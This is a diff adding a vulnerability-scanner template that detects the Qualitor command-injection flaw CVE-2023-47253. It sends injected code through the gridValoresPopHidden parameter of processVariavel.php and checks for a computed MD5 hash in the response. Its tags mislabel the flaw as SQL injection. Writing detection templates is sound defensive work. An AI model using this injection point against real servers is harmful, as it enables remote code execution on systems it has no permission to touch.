@@ -1,0 +1,26 @@
+id: qualitor-processvar-rce
+info:
+  name: Qualitor Command Injection Vulnerability (CVE-2023-47253)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection,CVE-2023-47253
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "/html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20md5({{t1}});"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "closeWindow"
+        part: body
